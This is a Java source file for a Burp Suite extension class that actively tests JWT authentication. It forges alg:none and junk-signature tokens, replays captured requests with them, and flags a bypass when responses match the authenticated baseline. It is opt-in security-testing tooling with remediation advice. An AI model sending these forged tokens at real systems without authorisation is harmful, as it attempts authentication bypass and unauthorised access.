package com.b3xal.headeranalyzer.analyzer;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.b3xal.headeranalyzer.model.Confidence;
import com.b3xal.headeranalyzer.model.HeaderFinding;
import com.b3xal.headeranalyzer.model.HeaderFinding.Category;
import com.b3xal.headeranalyzer.model.Severity;
import com.b3xal.headeranalyzer.model.UrlAnalysisResult;
import com.b3xal.headeranalyzer.util.SafeLogging;
import com.b3xal.headeranalyzer.util.JsonUtil;
import com.b3xal.headeranalyzer.util.ThrottledRequestSender;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Active JWT bypass testing: unlike {@link JwtAnalyzer} (deliberately recognition-only, see that
 * class's own javadoc), this actually forges tokens and replays the original captured request
 * with the forgery swapped in, to test whether the server accepts them. Two basic, no-secret-
 * required attacks:
 *
 *  1) alg:none, PortSwigger/OWASP's standard PoC shape: the JOSE header's "alg" claim rewritten to
 *     "none", original payload untouched, signature segment emptied.
 *  2) Signature not verified at all: original alg/payload untouched, signature segment replaced
 *     with unrelated junk, if the server still accepts it, it isn't checking the signature by any
 *     algorithm, a broader bug than alg:none specifically.
 *
 * Both are diffed against the ORIGINAL response (the one that actually carried the valid token,
 * already captured, no extra request needed) AND a garbage-token control response, so a finding
 * only fires when the forged token's response resembles "authenticated" while a clearly-invalid
 * token's response does not, the same differential-testing shape {@code ActiveHeaderScanner}'s
 * CORS battery uses (reflected vs. baseline), applied to auth acceptance instead of header
 * reflection. Heuristic, not proof, every finding says so and gives the exact forged token so the
 * analyst can confirm by hand in Repeater before reporting it.
 *
 * Opt-in only ({@link com.b3xal.headeranalyzer.config.QuimeraSettings#isJwtActiveProbeEnabled()},
 * off by default): this sends real forged-authentication requests at the target, a categorically
 * more sensitive action than the read-only CORS/TRACE/HSTS probes.
 */
public final class JwtActiveProbe {

    private static final String LABEL = "JWT active probe (alg:none / signature bypass)";

    // A generic, well-formed-looking but definitely-unauthenticated JWT, used as the control to
    // establish what "the server rejected this" actually looks like for this endpoint. Fixed
    // rather than derived from the real token so its signature can never accidentally be valid.
    // Public: QuimeraHttpHandler/HeaderPassiveScanner check for this literal string directly (in
    // addition to MARKER_HEADER below) as a second, independent way to recognize this class's own
    // control traffic, belt and suspenders, this one doesn't depend on a custom request header
    // surviving the round trip through Burp's core at all, just the fixed, known token value
    // itself, which by definition has to survive (it's the whole content of the probe).
    public static final String GARBAGE_TOKEN =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJxdWltZXJhIjoicHJvYmUifQ.aW52YWxpZC1zaWduYXR1cmU";

    /** True if the request's Authorization or Cookie header contains {@link #GARBAGE_TOKEN}
     * verbatim. A substring check (not an exact-value match), the token can appear inside
     * "Bearer &lt;token&gt;" or inside a larger Cookie header alongside other cookies, either way
     * its mere presence proves this is this class's own synthetic comparison traffic, never
     * something a real target would send. Used by QuimeraHttpHandler/HeaderPassiveScanner as a
     * second, independent check alongside {@link #MARKER_HEADER}, this one doesn't depend on a
     * custom request header surviving anything, just the fixed token value itself. */
    public static boolean carriesGarbageToken(HttpRequest request) {
        var auth = request.header("Authorization");
        if (auth != null && auth.value() != null && auth.value().contains(GARBAGE_TOKEN)) return true;
        var cookie = request.header("Cookie");
        return cookie != null && cookie.value() != null && cookie.value().contains(GARBAGE_TOKEN);
    }

    // Every request this class sends (garbage control, forged alg:none, forged bad-signature)
    // carries a syntactically JWT-shaped token that was never issued by the target, purely
    // internal comparison material. Those requests are real Burp HTTP traffic though, so their
    // responses come back through QuimeraHttpHandler tagged EXTENSIONS same as everything else,
    // and the general passive pipeline (JwtAnalyzer et al.) doesn't know the difference, it was
    // flagging the GARBAGE_TOKEN itself as a genuine "JWT has no expiration claim" finding, a
    // false positive about Quimera's own synthetic data, not the target. This header lets
    // QuimeraHttpHandler recognize and skip exactly these three requests in that general pass;
    // this class's OWN verdict on the forged tokens (algNoneFinding/badSigFinding) is reported
    // through a completely separate, explicit call, unaffected by this exclusion.
    public static final String MARKER_HEADER = "X-Quimera-Jwt-Active-Probe";

    private final MontoyaApi api;
    private final HeaderAnalysisEngine engine;
    // See ActiveHeaderScanner's own field of the same type for why: routes this probe's forged
    // requests through Burp's project-configured resource pool instead of an unthrottled direct
    // send.
    private final ThrottledRequestSender sender;

    public JwtActiveProbe(MontoyaApi api, HeaderAnalysisEngine engine) {
        this.api    = api;
        this.engine = engine;
        this.sender = new ThrottledRequestSender(api, "Quimera - JWT active probe");
    }

    /** Called from {@code QuimeraHttpHandler.shutdown()} on extension unload/reload. */
    public void shutdown() {
        sender.shutdown();
    }

    /** One place a JWT was found in a request: the Authorization Bearer scheme, or a named
     * cookie. Query-string JWTs are deliberately not covered here, rare enough in practice, and
     * substituting a query parameter safely needs its own URL-rebuild path, not worth the
     * complexity for the "basic" active checks this class covers. */
    public record TokenLocation(String token, boolean isCookie, String cookieName, String cookieValue) {}

    /** Scans a captured request's Authorization and Cookie headers for JWT-shaped values,
     * reusing {@link JwtAnalyzer#looksLikeJwt} so "JWT-shaped" means exactly what the passive
     * analyzer already agreed it means. */
    public static List<TokenLocation> locate(HttpRequest request) {
        List<TokenLocation> found = new ArrayList<>();
        if (request == null) return found;

        var auth = request.header("Authorization");
        if (auth != null && auth.value() != null) {
            String v = auth.value().trim();
            int space = v.indexOf(' ');
            String scheme = space > 0 ? v.substring(0, space) : "";
            String rest   = space > 0 ? v.substring(space + 1).trim() : "";
            if (scheme.equalsIgnoreCase("Bearer") && JwtAnalyzer.looksLikeJwt(rest)) {
                found.add(new TokenLocation(rest, false, null, null));
            }
        }

        var cookie = request.header("Cookie");
        if (cookie != null && cookie.value() != null) {
            for (String pair : cookie.value().split(";")) {
                int eq = pair.indexOf('=');
                if (eq <= 0) continue;
                String name  = pair.substring(0, eq).trim();
                String value = pair.substring(eq + 1).trim();
                for (StructuredCookieJwtAnalyzer.ExtractedJwt jwt : StructuredCookieJwtAnalyzer.extract(value)) {
                    found.add(new TokenLocation(jwt.token(), true, name, value));
                }
            }
        }
        return found;
    }

    /**
     * Runs both forged-token checks against one token location and returns a single
     * {@link UrlAnalysisResult} with whatever findings survived the differential check, or null
     * if nothing looked vulnerable (deliberately not producing a noise row for every clean JWT).
     *
     * @param template          the exact original request that carried the valid token
     * @param baselineResponse  the response THAT request actually got (already captured, no
     *                          extra request needed for the "valid token" baseline)
     */
    public UrlAnalysisResult probe(String url, HttpRequest template, HttpResponse baselineResponse,
                                    TokenLocation loc) {
        if (template == null || baselineResponse == null || loc == null) return null;

        HttpRequest control = withToken(template, loc, GARBAGE_TOKEN);
        if (control == null) return null;
        HttpRequestResponse controlRr = safeSend(control);
        if (controlRr == null || controlRr.response() == null) return null;

        // If even an obviously-garbage token gets a response indistinguishable from the valid
        // one, either this specific response doesn't actually depend on the token (a shared
        // layout page, a 200 that varies only in a fragment this diff can't see) or the endpoint
        // doesn't require auth at all, either way, an "accepted" verdict on the forged tokens
        // below would prove nothing, skip rather than risk a false positive.
        if (ResponseSimilarity.equivalent(baselineResponse, controlRr.response())) return null;

        List<HeaderFinding> findings = new ArrayList<>();
        // Only the exchange behind the FIRST finding that actually fires becomes the shown
        // evidence, never "whichever forgery was attempted last" regardless of whether it
        // succeeded: same bug shape as ActiveHeaderScanner's cache-key probe once had (see its own
        // fix), worse here since there is no probeExchanges selector to fall back on, an analyst
        // could otherwise be shown the REJECTED bad-signature attempt as "proof" of an alg:none
        // bypass that a different request actually demonstrated.
        HttpRequestResponse evidenceRr = controlRr;

        String algNone = forgeAlgNoneToken(loc.token());
        if (algNone != null) {
            HttpRequest forgedRequest = withToken(template, loc, algNone);
            HttpRequestResponse rr = forgedRequest == null ? null : safeSend(forgedRequest);
            if (rr != null && rr.response() != null
                    && ResponseSimilarity.equivalent(baselineResponse, rr.response())) {
                findings.add(algNoneFinding(loc, algNone, rr));
                if (findings.size() == 1) evidenceRr = rr;
            }
        }

        String badSig = forgeBadSignatureToken(loc.token());
        if (badSig != null) {
            HttpRequest forgedRequest = withToken(template, loc, badSig);
            HttpRequestResponse rr = forgedRequest == null ? null : safeSend(forgedRequest);
            if (rr != null && rr.response() != null
                    && ResponseSimilarity.equivalent(baselineResponse, rr.response())) {
                findings.add(badSigFinding(loc, badSig, rr));
                if (findings.size() == 1) evidenceRr = rr;
            }
        }

        if (findings.isEmpty()) return null;

        Map<String, String> headerMap = collectHeaders(evidenceRr);
        UrlAnalysisResult result = engine.analyze(url, headerMap, evidenceRr.response().statusCode(),
                evidenceRr.response().bodyToString(), evidenceRr.request().method());
        result.rawRequest  = safeToString(evidenceRr.request());
        result.rawResponse = safeToString(evidenceRr.response());
        result.method           = evidenceRr.request() != null ? evidenceRr.request().method() : null;
        result.statusCode       = evidenceRr.response().statusCode();
        result.contentLength    = evidenceRr.response().body().length();
        result.probeLabel       = LABEL;
        result.originalRequest  = evidenceRr.request();
        result.originalResponse = evidenceRr.response();
        return result.withExtraFindings(findings);
    }

    // ------ Forging ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    @SuppressWarnings("unchecked")
    private static String forgeAlgNoneToken(String token) {
        try {
            String[] parts = token.split("\\.", -1);
            if (parts.length != 3) return null;
            Object parsed = JsonUtil.parse(b64UrlDecode(parts[0]));
            if (!(parsed instanceof Map<?, ?> m)) return null;
            LinkedHashMap<String, Object> header = new LinkedHashMap<>((Map<String, Object>) m);
            header.put("alg", "none");
            String forgedHeader = b64UrlEncode(JsonUtil.write(header));
            // Empty signature segment (trailing dot kept), the standard alg:none PoC shape,
            // payload untouched so any claims the analyst cares about stay intact/inspectable.
            return forgedHeader + "." + parts[1] + ".";
        } catch (Exception ex) {
            return null;
        }
    }

    private static String forgeBadSignatureToken(String token) {
        String[] parts = token.split("\\.", -1);
        if (parts.length != 3) return null;
        String junk = "aW52YWxpZC1zaWduYXR1cmU"; // "invalid-signature", base64url, no padding
        if (junk.equals(parts[2])) junk = "d3Jvbmctc2lnbmF0dXJl"; // "wrong-signature", extremely unlikely collision fallback
        return parts[0] + "." + parts[1] + "." + junk;
    }

    private static String b64UrlDecode(String segment) {
        String padded = segment;
        int rem = padded.length() % 4;
        if (rem == 2) padded += "==";
        else if (rem == 3) padded += "=";
        return new String(Base64.getUrlDecoder().decode(padded), StandardCharsets.UTF_8);
    }

    private static String b64UrlEncode(String plain) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(plain.getBytes(StandardCharsets.UTF_8));
    }

    // ------ Request building ---------------------------------------------------------------------------------------------------------------------------------------------------------------

    /** {@link #MARKER_HEADER} lets QuimeraHttpHandler recognize this exact request when its
     * response comes back through Burp's core (tagged EXTENSIONS) and skip re-running it through
     * the general passive pipeline, see that header's own javadoc for why. */
    private static HttpRequest withToken(HttpRequest template, TokenLocation loc, String newToken) {
        HttpRequest marked = template.withUpdatedHeader(MARKER_HEADER, "1");
        if (loc.isCookie()) {
            var cookieHeader = marked.header("Cookie");
            String replacement = StructuredCookieJwtAnalyzer.replaceToken(
                    loc.cookieValue(), loc.token(), newToken);
            if (replacement == null) return null;
            String rebuilt = replaceCookieValue(cookieHeader != null ? cookieHeader.value() : "",
                    loc.cookieName(), replacement);
            return marked.withUpdatedHeader("Cookie", rebuilt);
        }
        return marked.withUpdatedHeader("Authorization", "Bearer " + newToken);
    }

    private static String replaceCookieValue(String cookieHeader, String targetName, String newValue) {
        StringBuilder sb = new StringBuilder();
        for (String pair : cookieHeader.split(";")) {
            String trimmed = pair.trim();
            int eq = trimmed.indexOf('=');
            if (eq <= 0) continue;
            String name  = trimmed.substring(0, eq).trim();
            String value = name.equals(targetName) ? newValue : trimmed.substring(eq + 1).trim();
            if (sb.length() > 0) sb.append("; ");
            sb.append(name).append('=').append(value);
        }
        return sb.toString();
    }

    private HttpRequestResponse safeSend(HttpRequest req) {
        try {
            return sender.send(req);
        } catch (Exception ex) {
            SafeLogging.error(api, "[Quimera] JWT active probe request error: " + ex.getMessage());
            return null;
        }
    }

    private static int safeLen(String s) { return s == null ? 0 : s.length(); }

    private static String safeToString(Object httpMessage) {
        try { return httpMessage == null ? null : httpMessage.toString(); } catch (Exception ex) { return null; }
    }

    // ------ Findings ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    private static HeaderFinding algNoneFinding(TokenLocation loc, String forgedToken, HttpRequestResponse rr) {
        String where = loc.isCookie() ? "Cookie: " + loc.cookieName() : "Authorization: Bearer";
        return new HeaderFinding(
            "JWT alg:none bypass accepted by server",
            loc.isCookie() ? loc.cookieName() : "Authorization",
            forgedToken,
            "Quimera replayed the original request with the JWT's 'alg' claim forged to 'none' and its " +
            "signature stripped (sent via " + where + "). The response (HTTP " + rr.response().statusCode() +
            ", " + safeLen(rr.response().bodyToString()) + " bytes) closely matches the response to the " +
            "ORIGINAL, validly-signed token, and clearly differs from the response to an unrelated garbage " +
            "token, meaning the server accepted this forged, unsigned token as authenticated. Anyone can now " +
            "construct an arbitrary token with any claims (identity, roles, permissions) and have it accepted " +
            "with no signature verification at all, a complete authentication bypass. This is a heuristic " +
            "response-similarity check, not proof, confirm by replaying this exact request in Repeater with " +
            "the forged token below before reporting it, then reject 'none' as a valid algorithm server-side.",
            "Forged token accepted: " + forgedToken,
            Severity.HIGH, Confidence.FIRM, Category.ACTIVE, "https://portswigger.net/web-security/jwt");
    }

    private static HeaderFinding badSigFinding(TokenLocation loc, String forgedToken, HttpRequestResponse rr) {
        String where = loc.isCookie() ? "Cookie: " + loc.cookieName() : "Authorization: Bearer";
        return new HeaderFinding(
            "JWT signature not verified by server (any signature accepted)",
            loc.isCookie() ? loc.cookieName() : "Authorization",
            forgedToken,
            "Quimera replayed the original request with the JWT's original algorithm and payload untouched " +
            "but its signature replaced with unrelated junk (sent via " + where + "). The response (HTTP " +
            rr.response().statusCode() + ", " + safeLen(rr.response().bodyToString()) + " bytes) closely " +
            "matches the response to the ORIGINAL, validly-signed token, and clearly differs from the response " +
            "to an unrelated garbage token, meaning the server is not actually verifying the signature at all, " +
            "a broader bug than alg:none specifically (fixing alg:none alone would not fix this). Anyone can " +
            "tamper with any claim in this token (identity, roles, permissions) without needing to forge a " +
            "valid signature. Heuristic response-similarity check, not proof, confirm by replaying this exact " +
            "request in Repeater with the forged token below before reporting it, then fix signature " +
            "verification server-side (and ensure it cannot be bypassed by a malformed/absent signature).",
            "Forged token accepted: " + forgedToken,
            Severity.HIGH, Confidence.FIRM, Category.ACTIVE);
    }

    // ------ Shared helpers ------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    private static Map<String, String> collectHeaders(HttpRequestResponse rr) {
        Map<String, String> headerMap = new LinkedHashMap<>();
        rr.response().headers().forEach(h ->
                com.b3xal.headeranalyzer.util.HeaderMaps.addResponse(headerMap, h.name(), h.value()));
        return headerMap;
    }
}
